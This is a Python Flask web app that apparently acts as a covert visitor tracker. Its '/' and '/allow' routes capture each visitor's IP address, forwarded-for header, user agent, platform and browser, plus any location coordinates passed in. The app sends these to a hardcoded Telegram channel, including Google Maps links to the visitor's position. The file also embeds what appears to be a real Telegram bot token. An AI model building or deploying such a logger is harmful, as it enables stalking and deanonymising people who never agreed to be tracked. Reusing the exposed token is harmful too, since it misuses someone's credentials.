from flask import Flask, render_template, request
import requests
#from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
#app.wsgi_app = ProxyFix(app.wsgi_app)  # Integrate ProxyFix middleware

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
TELEGRAM_BOT_TOKEN = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
TELEGRAM_CHAT_ID = '@localipy'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, params=params)




@app.route('/')
def index():
    #
    
    #ip_address = request.remote_addr
    ip_address = request.remote_addr
    proxyy = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    user_agent = request.user_agent.string
    os = request.user_agent.platform
    device_model = request.user_agent.browser
    coords = request.args.get('coords')

 
    
    # Sending coordinates to Telegram
    if coords:
     ##   send_telegram_message(f"Location coordinates: {coords}")
          send_telegram_message(f"الاحداثيات:\n https://www.google.com/maps/place/{coords} \n\n{ip_address}")

    # Storing and sending user information to Telegram
    #\nUser Agent: {user_agent}
    message = f"IP: {ip_address}\nProxy: {proxyy}\nOS: {os}\nModdel: {device_model}\n\nUSER AGENT: \n{user_agent}"
    send_telegram_message(message)
    #
    return render_template('index.html')



###XXXXXXXXXXXXXXXXXXX
@app.route('/allow')
def allow():
    #
    
    
    ip_address = request.remote_addr
    proxyy = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
  #  user_agent = request.user_agent.string
   # os = request.user_agent.platform
   # device_model = request.user_agent.browser
    coords = request.args.get('coords')

 
    
    # Sending coordinates to Telegram
    if coords:
        send_telegram_message(f"Location coordinates: {coords}==>{ip_address}")

    # Storing and sending user information to Telegram
    #\nUser Agent: {user_agent}
   # message = f"IP: {ip_address}\nProxy: {proxyy}\nOS: {os}\nModdel: {device_model}\n\nUSER AGENT: \n{user_agent}"
   # send_telegram_message(message)
    #
    return render_template('index.html')







if __name__ == '__main__':
    app.run(debug=True)
